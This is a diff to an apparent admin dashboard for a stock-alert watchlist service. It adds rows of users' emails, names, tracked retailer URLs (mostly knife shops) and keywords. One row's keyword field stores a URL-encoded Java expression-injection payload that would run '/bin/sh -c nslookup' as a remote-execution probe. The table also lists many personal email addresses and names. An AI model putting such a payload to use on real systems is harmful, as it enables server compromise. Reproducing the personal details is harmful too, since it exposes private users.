+          <td class="url-cell" title="https://www.dlttrading.com/bark-river-bushcrafter-lt-3v"><a href="https://www.dlttrading.com/bark-river-bushcrafter-lt-3v" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="Bark River Bushcrafter">Bark River Bushcrafter</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-23 15:23</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simon@instockornot.club</td>
+          <td>MUSIC TEST</td>
+          <td class="url-cell" title="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/"><a href="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/" target="_blank" style="color:var(--flame)">mickstridercustomknives.com</a></td>
+          <td class="kw-cell" title="in stock">in stock</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>5</td>
+          <td></td>
+          <td>2026-03-23 08:39</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>davidcspann@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.dlttrading.com/"><a href="https://www.dlttrading.com/" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="15v native chief Spyderco">15v native chief Spyderco</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-22 19:21</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>davidcspann@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.dlttrading.com/spyderco-paramilitary-2-lightweight-brown-frn-15v-blade-sprint-run"><a href="https://www.dlttrading.com/spyderco-paramilitary-2-lightweight-brown-frn-15v-blade-sprint-run" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="15v lightweight paramilitary 2">15v lightweight paramilitary 2</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-22 19:18</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>medel_andrew@yahoo.com</td>
+          <td>Medel_andrew@yahoo.com</td>
+          <td class="url-cell" title="https://www.dlttrading.com/"><a href="https://www.dlttrading.com/" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="Ad20 ad22 ad20s shark atac">Ad20 ad22 ad20s shark atac</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-22 13:37</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>medel_andrew@yahoo.com</td>
+          <td>Andrew</td>
+          <td class="url-cell" title="https://demkoknives.com/"><a href="https://demkoknives.com/" target="_blank" style="color:var(--flame)">demkoknives.com</a></td>
+          <td class="kw-cell" title="Ad20 AD20s ad22 shark atac">Ad20 AD20s ad22 shark atac</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-22 13:35</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>medel_andrew@yahoo.com</td>
+          <td>Andrew</td>
+          <td class="url-cell" title="https://www.knifejoy.com/"><a href="https://www.knifejoy.com/" target="_blank" style="color:var(--flame)">knifejoy.com</a></td>
+          <td class="kw-cell" title="Demko ad20 AD20s ad22 shark atac">Demko ad20 AD20s ad22 shark atac</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-22 13:27</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>fabianskilandon@yahoo.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.knifejoy.com/collections/chris-reeve-knives"><a href="https://www.knifejoy.com/collections/chris-reeve-knives" target="_blank" style="color:var(--flame)">knifejoy.com</a></td>
+          <td class="kw-cell" title="Inkosi Insingo Glass Blasted Large Black Canvas Unique Graphic
+Design">Inkosi Insingo Glass Blasted Large Black Canvas Unique Graphic
+Design</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-22 04:23</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>fabianskilandon@yahoo.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.dlttrading.com/newest-arrivals"><a href="https://www.dlttrading.com/newest-arrivals" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="Inkosi Insingo Glass Blasted Large Black Canvas Unique Graphic
+Sebenza">Inkosi Insingo Glass Blasted Large Black Canvas Unique Graphic
+Sebenza</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>27</td>
+          <td></td>
+          <td>2026-03-22 04:21</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>fabianskilandon@yahoo.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://riversedgecutlery.com/chris-reeve-knives/"><a href="https://riversedgecutlery.com/chris-reeve-knives/" target="_blank" style="color:var(--flame)">riversedgecutlery.com</a></td>
+          <td class="kw-cell" title="Inkosi Insingo Glass Blasted Large Black Canvas Unique Graphic">Inkosi Insingo Glass Blasted Large Black Canvas Unique Graphic</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-22 04:18</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>mcintire104@gmail.com</td>
+          <td>Everett</td>
+          <td class="url-cell" title="https://www.dlttrading.com/"><a href="https://www.dlttrading.com/" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="Great Eastern Cutlery">Great Eastern Cutlery</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-22 04:16</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>msnknight@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/"><a href="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/" target="_blank" style="color:var(--flame)">mickstridercustomknives.com</a></td>
+          <td class="kw-cell" title="SMF">SMF</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>6</td>
+          <td>&#x2713;</td>
+          <td>2026-03-22 04:15</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>gammonz@yahoo.com</td>
+          <td>Zac</td>
+          <td class="url-cell" title="https://monkeyedge.com/chris-reeve-knives-folder-umnumzaan-drop-point-monkey-edge-frag-pattern/"><a href="https://monkeyedge.com/chris-reeve-knives-folder-umnumzaan-drop-point-monkey-edge-frag-pattern/" target="_blank" style="color:var(--flame)">monkeyedge.com</a></td>
+          <td class="kw-cell" title="Umnumzaan">Umnumzaan</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-21 19:04</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>prakow@gmail.com</td>
+          <td>Peter</td>
+          <td class="url-cell" title="https://spyderco.com/products/para-military%C2%AE-2-lightweight-brown-cpm-15v%C2%AE-sprint-run%C2%AE"><a href="https://spyderco.com/products/para-military%C2%AE-2-lightweight-brown-cpm-15v%C2%AE-sprint-run%C2%AE" target="_blank" style="color:var(--flame)">spyderco.com</a></td>
+          <td class="kw-cell" title="Paramilitary 2 15v brown lightweight">Paramilitary 2 15v brown lightweight</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-21 01:53</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>prakow@gmail.com</td>
+          <td>Peter</td>
+          <td class="url-cell" title="https://quietcarry.com/collections/the-shallows/products/the-quillpoint-blbusw-vanax-superclean"><a href="https://quietcarry.com/collections/the-shallows/products/the-quillpoint-blbusw-vanax-superclean" target="_blank" style="color:var(--flame)">quietcarry.com</a></td>
+          <td class="kw-cell" title="Quiet carry the shallows black deep blue">Quiet carry the shallows black deep blue</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-21 01:31</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>prakow@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.bladehq.com/item--Spyderco-Paramilitary-2-C81PBN15V2--227840"><a href="https://www.bladehq.com/item--Spyderco-Paramilitary-2-C81PBN15V2--227840" target="_blank" style="color:var(--flame)">bladehq.com</a></td>
+          <td class="kw-cell" title="Paramilitary 2 15v">Paramilitary 2 15v</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-20 23:08</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>justin_ver1.0@hotmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.collectorknives.net/product-category/great-eastern-cutlery/"><a href="https://www.collectorknives.net/product-category/great-eastern-cutlery/" target="_blank" style="color:var(--flame)">collectorknives.net</a></td>
+          <td class="kw-cell" title="Great Easter cutlery">Great Easter cutlery</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-20 20:23</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>justin_ver1.0@hotmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.dlttrading.com/great-eastern-cutlery"><a href="https://www.dlttrading.com/great-eastern-cutlery" target="_blank" style="color:var(--flame)">dlttrading.com</a></td>
+          <td class="kw-cell" title="In stock and ready to ship">In stock and ready to ship</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-20 20:18</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>turbo91199@aol.com</td>
+          <td>Dylan James Lanza</td>
+          <td class="url-cell" title="https://kizerknives.com/collections/drop-bear-zero"><a href="https://kizerknives.com/collections/drop-bear-zero" target="_blank" style="color:var(--flame)">kizerknives.com</a></td>
+          <td class="kw-cell" title="Drop bear 0, discount, sale, clearance">Drop bear 0, discount, sale, clearance</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>80</td>
+          <td>&#x2713;</td>
+          <td>2026-03-20 12:58</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>dawson798@gmail.com</td>
+          <td>Dawson</td>
+          <td class="url-cell" title="https://maxaceknife.com/?product=uranus-2-0"><a href="https://maxaceknife.com/?product=uranus-2-0" target="_blank" style="color:var(--flame)">maxaceknife.com</a></td>
+          <td class="kw-cell" title="Uranus 2.0 OTF.">Uranus 2.0 OTF.</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-03-20 12:41</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>jeremyj3232@gmail.com</td>
+          <td>JJ</td>
+          <td class="url-cell" title="https://monkeyedge.com/new-exclusive/"><a href="https://monkeyedge.com/new-exclusive/" target="_blank" style="color:var(--flame)">monkeyedge.com</a></td>
+          <td class="kw-cell" title="Zaan, strider">Zaan, strider</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-20 03:33</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>bigbradley@live.com</td>
+          <td>Bradley Wareham</td>
+          <td class="url-cell" title="https://maxaceknife.com/"><a href="https://maxaceknife.com/" target="_blank" style="color:var(--flame)">maxaceknife.com</a></td>
+          <td class="kw-cell" title="Maxace">Maxace</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-20 02:04</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>kenthinesley@gmail.com</td>
+          <td>Erik</td>
+          <td class="url-cell" title="https://www.caesars.com/reno/casino-promotions/tier-credit-multiplier"><a href="https://www.caesars.com/reno/casino-promotions/tier-credit-multiplier" target="_blank" style="color:var(--flame)">caesars.com</a></td>
+          <td class="kw-cell" title="10X Tier Credit Multiplier">10X Tier Credit Multiplier</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 22:07</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>kenthinesley@gmail.com</td>
+          <td>Erik</td>
+          <td class="url-cell" title="https://www.apmex.com/silver-price"><a href="https://www.apmex.com/silver-price" target="_blank" style="color:var(--flame)">apmex.com</a></td>
+          <td class="kw-cell" title="$90.00 USD,$91.00 USD,$92.00 USD,$93.00 USD,$94.00 USD,">$90.00 USD,$91.00 USD,$92.00 USD,$93.00 USD,$94.00 USD,</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 22:04</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>kenthinesley@gmail.com</td>
+          <td>Erik</td>
+          <td class="url-cell" title="https://www.legacy.com/us/obituaries/local/california/malibu"><a href="https://www.legacy.com/us/obituaries/local/california/malibu" target="_blank" style="color:var(--flame)">legacy.com</a></td>
+          <td class="kw-cell" title="Dick Van Dyke">Dick Van Dyke</td>
+          <td><span class="badge badge-medium">medium</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 21:59</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>kenthinesley@gmail.com</td>
+          <td>Erik</td>
+          <td class="url-cell" title="https://www.matthewwest.com/tour"><a href="https://www.matthewwest.com/tour" target="_blank" style="color:var(--flame)">matthewwest.com</a></td>
+          <td class="kw-cell" title="Roseville, CA, Sacramento, Reno, Medford">Roseville, CA, Sacramento, Reno, Medford</td>
+          <td><span class="badge badge-medium">medium</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 21:55</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>kenthinesley@gmail.com</td>
+          <td>Erik</td>
+          <td class="url-cell" title="https://www.skillet.com/shows"><a href="https://www.skillet.com/shows" target="_blank" style="color:var(--flame)">skillet.com</a></td>
+          <td class="kw-cell" title="Sacramento, Reno, Roseville, CA, Medford">Sacramento, Reno, Roseville, CA, Medford</td>
+          <td><span class="badge badge-medium">medium</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 21:48</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simon@instockornot.club</td>
+          <td>simon</td>
+          <td class="url-cell" title="https://southernedges.com/collections/strider-custom-knives"><a href="https://southernedges.com/collections/strider-custom-knives" target="_blank" style="color:var(--flame)">southernedges.com</a></td>
+          <td class="kw-cell" title="chris reeve damascus">chris reeve damascus</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 06:17</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>mike.newborn@gmail.com</td>
+          <td>MikeUVA123</td>
+          <td class="url-cell" title="https://store.ui.com/us/en/category/cameras-dome-turret/products/uvc-g6-180?variant=uvc-g6-180-w"><a href="https://store.ui.com/us/en/category/cameras-dome-turret/products/uvc-g6-180?variant=uvc-g6-180-w" target="_blank" style="color:var(--flame)">store.ui.com</a></td>
+          <td class="kw-cell" title="add to cart">add to cart</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 04:42</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>mike.newborn@gmail.com</td>
+          <td>MikeUVA123</td>
+          <td class="url-cell" title="https://store.ui.com/us/en/category/cameras-dome-turret/products/uvc-g6-180?variant=uvc-g6-180-b"><a href="https://store.ui.com/us/en/category/cameras-dome-turret/products/uvc-g6-180?variant=uvc-g6-180-b" target="_blank" style="color:var(--flame)">store.ui.com</a></td>
+          <td class="kw-cell" title="in stock add to cart">in stock add to cart</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-17 04:41</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simon@instockornot.club</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.africansportingcreations.com/grey-hippo-safari.html"><a href="https://www.africansportingcreations.com/grey-hippo-safari.html" target="_blank" style="color:var(--flame)">africansportingcreations.com</a></td>
+          <td class="kw-cell" title="in stock">in stock</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-16 22:59</td>
+        </tr><tr>
+          <td><span class="badge badge-active">Active</span></td>
+          <td>simon@instockornot.club</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.rickhindererknives.com/shop-knives/in-stock-knives/"><a href="https://www.rickhindererknives.com/shop-knives/in-stock-knives/" target="_blank" style="color:var(--flame)">rickhindererknives.com</a></td>
+          <td class="kw-cell" title="steel flame">steel flame</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>1</td>
+          <td></td>
+          <td>2026-03-15 16:18</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>ilia.shlimsk@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://spyderco.com/"><a href="https://spyderco.com/" target="_blank" style="color:var(--flame)">spyderco.com</a></td>
+          <td class="kw-cell" title="Spyderco">Spyderco</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-19 15:03</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>test@test.com</td>
+          <td>DickWeeds</td>
+          <td class="url-cell" title="https://instockornot.club/watchlist.html"><a href="https://instockornot.club/watchlist.html" target="_blank" style="color:var(--flame)">instockornot.club</a></td>
+          <td class="kw-cell" title="%7d$%7b&#x27;&#x27;%2egetClass()%2eforName(&#x27;javax%2escript%2eScriptEngineManager&#x27;)%2enewInstance()%2egetEngineByName(&#x27;JavaScript&#x27;)%2eeval(&#x27;new%20java%2elang%2eProcessBuilder[%5c&#x27;(java%2elang%2eString[])%5c&#x27;]([%5c&#x27;%2fbin%2fsh%5c&#x27;,%5c&#x27;-c%5c&#x27;,%5c&#x27;nslookup%20%7bdomain%7d%5c&#x27;])%2estart()&#x27;)%7d$%7b">%7d$%7b&#x27;&#x27;%2egetClass()%2eforName(&#x27;javax%2escript%2eScriptEngineManager&#x27;)%2enewInstance()%2egetEngineByName(&#x27;JavaScript&#x27;)%2eeval(&#x27;new%20java%2elang%2eProcessBuilder[%5c&#x27;(java%2elang%2eString[])%5c&#x27;]([%5c&#x27;%2fbin%2fsh%5c&#x27;,%5c&#x27;-c%5c&#x27;,%5c&#x27;nslookup%20%7bdomain%7d%5c&#x27;])%2estart()&#x27;)%7d$%7b</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-15 18:51</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>dkennedyslesar@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://recon1.com/"><a href="https://recon1.com/" target="_blank" style="color:var(--flame)">recon1.com</a></td>
+          <td class="kw-cell" title="Neon">Neon</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-14 00:44</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>saecotech@gmail.com</td>
+          <td>saecotech</td>
+          <td class="url-cell" title="https://grimsmoknives.com/collections/fjell-inventory"><a href="https://grimsmoknives.com/collections/fjell-inventory" target="_blank" style="color:var(--flame)">grimsmoknives.com</a></td>
+          <td class="kw-cell" title="Fjell">Fjell</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-07 20:16</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>saecotech@gmail.com</td>
+          <td>saecotech</td>
+          <td class="url-cell" title="https://monkeyedge.com/knives-tools/folders/?sort=newest"><a href="https://monkeyedge.com/knives-tools/folders/?sort=newest" target="_blank" style="color:var(--flame)">monkeyedge.com</a></td>
+          <td class="kw-cell" title="Strider, chris reeve, limited, shiro">Strider, chris reeve, limited, shiro</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-04-07 17:07</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>info@instockornot.club</td>
+          <td>—</td>
+          <td class="url-cell" title="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/"><a href="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/" target="_blank" style="color:var(--flame)">mickstridercustomknives.com</a></td>
+          <td class="kw-cell" title="in stock">in stock</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>4</td>
+          <td>&#x2713;</td>
+          <td>2026-04-01 22:09</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>info@instorckornot.club</td>
+          <td>PRE DB_MG TEST</td>
+          <td class="url-cell" title="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/"><a href="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/" target="_blank" style="color:var(--flame)">mickstridercustomknives.com</a></td>
+          <td class="kw-cell" title="add to cart">add to cart</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>0</td>
+          <td>&#x2713;</td>
+          <td>2026-04-01 21:52</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>rick@support-intelligence.com</td>
+          <td>Rick Wesson</td>
+          <td class="url-cell" title="https://usamadeblade.com/collections/rick-hinderer-knives/products/hinderer-xm-18-3-0-bowie-flipper-black-g10-working-finish-ti-with-stonewashed-20cv-blade?variant=53533267230933"><a href="https://usamadeblade.com/collections/rick-hinderer-knives/products/hinderer-xm-18-3-0-bowie-flipper-black-g10-working-finish-ti-with-stonewashed-20cv-blade?variant=53533267230933" target="_blank" style="color:var(--flame)">usamadeblade.com</a></td>
+          <td class="kw-cell" title="knife">knife</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>1</td>
+          <td>&#x2713;</td>
+          <td>2026-03-30 21:15</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>saecotech@gmail.com</td>
+          <td>saecotech</td>
+          <td class="url-cell" title="https://www.shop.princecustoms.com/"><a href="https://www.shop.princecustoms.com/" target="_blank" style="color:var(--flame)">shop.princecustoms.com</a></td>
+          <td class="kw-cell" title="Protean">Protean</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>0</td>
+          <td></td>
+          <td>2026-03-28 18:47</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>simonhg@gmail.com</td>
+          <td>Strider Test to see if signal is real</td>
+          <td class="url-cell" title="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/"><a href="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/" target="_blank" style="color:var(--flame)">mickstridercustomknives.com</a></td>
+          <td class="kw-cell" title="add to cart">add to cart</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>5</td>
+          <td>&#x2713;</td>
+          <td>2026-03-27 21:59</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>saecotech@gmail.com</td>
+          <td>saecotech</td>
+          <td class="url-cell" title="https://recon1.com/collections/new"><a href="https://recon1.com/collections/new" target="_blank" style="color:var(--flame)">recon1.com</a></td>
+          <td class="kw-cell" title="Strider, Chris Reeve, Limited, Shiro, Koenig">Strider, Chris Reeve, Limited, Shiro, Koenig</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>36</td>
+          <td></td>
+          <td>2026-03-24 19:49</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>saecotech@gmail.com</td>
+          <td>saecotech</td>
+          <td class="url-cell" title="https://ncblade.com/collections/new-products-1"><a href="https://ncblade.com/collections/new-products-1" target="_blank" style="color:var(--flame)">ncblade.com</a></td>
+          <td class="kw-cell" title="Strider, Chris Reeve, Limited, Shiro, Koenig">Strider, Chris Reeve, Limited, Shiro, Koenig</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>1</td>
+          <td></td>
+          <td>2026-03-24 19:48</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>saecotech@gmail.com</td>
+          <td>saecotech</td>
+          <td class="url-cell" title="https://eknives.com/new/"><a href="https://eknives.com/new/" target="_blank" style="color:var(--flame)">eknives.com</a></td>
+          <td class="kw-cell" title="Strider, Chris Reeve, Limited, Shiro, Koenig">Strider, Chris Reeve, Limited, Shiro, Koenig</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>20</td>
+          <td></td>
+          <td>2026-03-24 19:45</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>saecotech@gmail.com</td>
+          <td>saecotech</td>
+          <td class="url-cell" title="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/"><a href="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/" target="_blank" style="color:var(--flame)">mickstridercustomknives.com</a></td>
+          <td class="kw-cell" title="SNG">SNG</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>2</td>
+          <td>&#x2713;</td>
+          <td>2026-03-24 19:41</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>simon@binhysoakland.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://www.tacticalelements.com/folding-knives/"><a href="https://www.tacticalelements.com/folding-knives/" target="_blank" style="color:var(--flame)">tacticalelements.com</a></td>
+          <td class="kw-cell" title="steel flame">steel flame</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>15</td>
+          <td></td>
+          <td>2026-03-22 07:49</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>gibson.simon1@gmail.com</td>
+          <td>—</td>
+          <td class="url-cell" title="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/"><a href="https://mickstridercustomknives.com/product-category/mick-strider-knives/available-mick-strider-knives/" target="_blank" style="color:var(--flame)">mickstridercustomknives.com</a></td>
+          <td class="kw-cell" title="IN stock">IN stock</td>
+          <td><span class="badge badge-high">high</span></td>
+          <td>7</td>
+          <td></td>
+          <td>2026-03-21 07:06</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>turbo91199@aol.com</td>
+          <td>Dylan James Lanza</td>
+          <td class="url-cell" title="https://spyderco.com/products/ronin%E2%84%A2-2"><a href="https://spyderco.com/products/ronin%E2%84%A2-2" target="_blank" style="color:var(--flame)">spyderco.com</a></td>
+          <td class="kw-cell" title="Ronin 2, spyderco ronin 2, sale, discount, clearance">Ronin 2, spyderco ronin 2, sale, discount, clearance</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>2</td>
+          <td>&#x2713;</td>
+          <td>2026-03-20 13:00</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>turbo91199@aol.com</td>
+          <td>Dylan James Lanza</td>
+          <td class="url-cell" title="https://zt.kaiusa.com/0044.html"><a href="https://zt.kaiusa.com/0044.html" target="_blank" style="color:var(--flame)">zt.kaiusa.com</a></td>
+          <td class="kw-cell" title="Zt 0044, zero tolerance 0044, discount, sale">Zt 0044, zero tolerance 0044, discount, sale</td>
+          <td><span class="badge badge-critical">critical</span></td>
+          <td>93</td>
+          <td>&#x2713;</td>
+          <td>2026-03-20 12:55</td>
+        </tr><tr>
+          <td><span class="badge badge-pending">Pending</span></td>
+          <td>bhs.perryg@gmail.com</td>
+          <td>gio</td>
+          <td class="url-cell" title="https://www.reddit.com/r/bladesInStock"><a href="https://www.reddit.com/r/bladesInStock" target="_blank" style="color:var(--flame)">reddit.com</a></td>
+          <td class="kw-cell" title="umnumzaan">umnumzaan</td>
+          <td><span class="badge badge-medium">medium</span></td>
+          <td>70</td>
+          <td></td>
+          <td>2026-03-20 03:27</td>
+        </tr>
       </tbody>
     </table>
   </div>
@@ -242,123 +959,6 @@
   <span>instockornot.club — Admin</span>
   <span class="footer-hgr">HGR</span>
 </footer>
-
-<script>
-function timeAgo(ts) {
-  if (!ts) return '—';
-  const d = new Date(ts);
-  const now = new Date();
-  const mins = Math.floor((now - d) / 60000);
-  if (mins < 1) return 'just now';
-  if (mins < 60) return mins + 'm ago';
-  const hrs = Math.floor(mins / 60);
-  if (hrs < 24) return hrs + 'h ago';
-  const days = Math.floor(hrs / 24);
-  return days + 'd ago';
-}
-
-function shortDate(ts) {
-  if (!ts) return '—';
-  const d = new Date(ts);
-  return d.toLocaleDateString('en-US', { month: 'short', day: 'numeric' }) + ' ' +
-         d.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
-}
-
-function priorityBadge(p) {
-  const cls = { critical: 'badge-critical', high: 'badge-high', medium: 'badge-medium', low: 'badge-low' };
-  return '<span class="badge ' + (cls[p] || 'badge-low') + '">' + (p || 'low') + '</span>';
-}
-
-function statusBadge(active) {
